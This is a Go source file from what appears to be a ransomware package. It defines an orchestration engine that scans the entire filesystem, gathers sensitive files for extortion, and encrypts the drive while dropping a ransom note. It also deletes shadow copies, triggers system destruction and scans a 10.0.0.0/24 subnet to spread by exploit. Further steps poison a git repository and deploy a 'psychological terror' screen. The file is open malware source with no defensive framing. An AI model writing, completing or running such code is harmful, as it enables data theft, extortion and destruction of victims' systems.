package ransomware

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	Config       *RansomwareConfig
	Scanner      *RegexEngine
	Crypto       *HydraEngine
	Extortion    *ExtortionEngine
	Destruction  *DestructionEngine
	Propagation  *PropagationEngine
	Psychological *PsychologicalEngine
	AntiAnalysis *AntiAnalysisEngine
	Polymorph    *PolymorphEngine
	Trust        *TrustExploitEngine

	report  *RansomwareReport
	mu      sync.Mutex
	started time.Time
}

func NewEngine(cfg *RansomwareConfig) (*Engine, error) {
	hydra, err := NewHydraEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("hydra engine: %w", err)
	}

	scanner := NewRegexEngine(8)

	return &Engine{
		Config:       cfg,
		Scanner:      scanner,
		Crypto:       hydra,
		Extortion:    NewExtortionEngine(cfg),
		Destruction:  NewDestructionEngine(cfg),
		Propagation:  NewPropagationEngine(cfg),
		Psychological: NewPsychologicalEngine(cfg),
		AntiAnalysis: NewAntiAnalysisEngine(cfg),
		Polymorph:    NewPolymorphEngine(cfg),
		Trust:        NewTrustExploitEngine(cfg),
	}, nil
}

func (e *Engine) Execute(ctx context.Context, campaignID, companyName string) (*RansomwareReport, error) {
	e.mu.Lock()
	e.started = time.Now()
	e.report = &RansomwareReport{
		CampaignID: campaignID,
		StartedAt:  e.started,
	}
	e.mu.Unlock()

	var phases []PhaseReport

	phases = append(phases, e.phaseScan(ctx))
	phases = append(phases, e.phaseExfil(ctx))
	phases = append(phases, e.phaseEncrypt(ctx))
	phases = append(phases, e.phaseDestruct(ctx))
	phases = append(phases, e.phasePropagate(ctx))
	phases = append(phases, e.phasePsychological(ctx))

	e.mu.Lock()
	e.report.Phases = phases
	e.report.CompletedAt = time.Now()
	e.report.TotalElapsedMs = time.Since(e.started).Milliseconds()
	e.report.Success = true
	for _, p := range phases {
		if !p.Success {
			e.report.Success = false
			e.report.Error = p.Error
			break
		}
	}
	r := *e.report
	e.mu.Unlock()

	return &r, nil
}

func (e *Engine) phaseScan(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseScan, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	scanRoot := "/"
	if runtime.GOOS == "windows" {
		scanRoot = "C:\\"
	}

	results := make(chan ScanResult, 1000)
	sensitive := make(chan SensitiveData, 1000)
	done := make(chan struct{})

	var allResults []ScanResult
	var allSensitive []SensitiveData

	go func() {
		for r := range results {
			allResults = append(allResults, r)
		}
		close(sensitive)
	}()

	go func() {
		for s := range sensitive {
			allSensitive = append(allSensitive, s)
		}
		close(done)
	}()

	scanErr := e.Scanner.ScanDirectory(scanRoot, e.Config.ExcludePaths, results, sensitive)
	<-done

	e.mu.Lock()
	e.report.FilesScanned = len(allResults)
	e.report.SensitiveFound = len(allSensitive)
	e.mu.Unlock()

	scanned, matched := e.Scanner.Stats()

	detail := fmt.Sprintf("scanned=%d matched=%d files=%d sensitive=%d", scanned, matched, len(allResults), len(allSensitive))
	success := scanErr == nil || len(allResults) > 0

	return PhaseReport{
		Phase:     PhaseScan,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   success,
		Error:     errorString(scanErr),
		Detail:    detail,
	}
}

func (e *Engine) phaseExfil(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseExfil, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	var sensitiveFiles []string

	scanRoot := "/"
	if runtime.GOOS == "windows" {
		scanRoot = "C:\\"
	}

	filepath.Walk(scanRoot, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if e.Config.ShouldExfil(path) {
			sensitiveFiles = append(sensitiveFiles, path)
		}
		if len(sensitiveFiles) >= 100 {
			return fmt.Errorf("limit")
		}
		return nil
	})

	if len(sensitiveFiles) > 0 {
		pkg, _ := e.Extortion.PackageSensitiveData(sensitiveFiles, "")
		if pkg != nil {
			e.mu.Lock()
			e.report.ExfilPackages++
			e.mu.Unlock()
		}
	}

	detail := fmt.Sprintf("files=%d packages=%d", len(sensitiveFiles), e.report.ExfilPackages)

	return PhaseReport{
		Phase:     PhaseExfil,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    detail,
	}
}

func (e *Engine) phaseEncrypt(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseEncrypt, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	scanRoot := "/"
	if runtime.GOOS == "windows" {
		scanRoot = "C:\\"
	}

	encrypted, err := e.Crypto.EncryptDirectory(scanRoot, e.Config.EncryptExtensions, e.Config.DoubleEncryptCritical)
	if err != nil {
	}

	e.Crypto.SplitMasterKey()

	note := e.Extortion.GenerateRansomNote(companyNameForReport(scanRoot))
	if deployErr := e.Extortion.DeployRansomNote(scanRoot, note); deployErr != nil {
	}

	e.mu.Lock()
	e.report.FilesEncrypted = e.Crypto.Stats()
	e.report.RansomNoteDeployed = true
	e.mu.Unlock()

	detail := fmt.Sprintf("encrypted=%d", encrypted)

	return PhaseReport{
		Phase:     PhaseEncrypt,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    detail,
	}
}

func (e *Engine) phaseDestruct(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseDestruct, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	if !e.Config.MFTDestruct && !e.Config.FirmwareSabotage && !e.Config.CloudBackupKill {
		return PhaseReport{Phase: PhaseDestruct, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped (no destruction options enabled)"}
	}

	e.Destruction.DeleteShadowCopies()

	err := e.Destruction.DestroySystem()

	e.mu.Lock()
	e.report.DestructionApplied = err == nil
	e.mu.Unlock()

	detail := "destruction applied"
	if err != nil {
		detail = fmt.Sprintf("destruction error: %v", err)
	}

	return PhaseReport{
		Phase:     PhaseDestruct,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   err == nil,
		Error:     errorString(err),
		Detail:    detail,
	}
}

func (e *Engine) phasePropagate(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhasePropagate, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	targets := e.Propagation.DiscoverTargets("10.0.0.0/24", nil)
	propagated := 0

	for _, t := range targets {
		if err := ctx.Err(); err != nil {
			break
		}
		if err := e.Propagation.ExecuteExploit(t); err == nil {
			propagated++
		}
	}

	e.Propagation.PoisonGitRepo("/tmp/repo", "echo pwned")

	e.mu.Lock()
	e.report.HostsPropagated = propagated
	e.mu.Unlock()

	detail := fmt.Sprintf("targets=%d exploited=%d", len(targets), propagated)

	return PhaseReport{
		Phase:     PhasePropagate,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    detail,
	}
}

func (e *Engine) phasePsychological(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhasePsychological, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	if !e.Config.PsychologicalTerror {
		return PhaseReport{Phase: PhasePsychological, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped (psychological terror disabled)"}
	}

	e.Psychological.DeployRansomwareUI("X404X Target")
	e.Psychological.DeployTerror()

	e.mu.Lock()
	e.report.PsychologicalDeployed = true
	e.mu.Unlock()

	return PhaseReport{
		Phase:     PhasePsychological,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    "psychological terror deployed",
	}
}

func (e *Engine) Report() *RansomwareReport {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.report
}

func companyNameForReport(root string) string {
	host, _ := os.Hostname()
	host = strings.ToUpper(host)
	if host == "" {
		return "Unknown Corporation"
	}
	return host + " INC."
}

func errorString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}
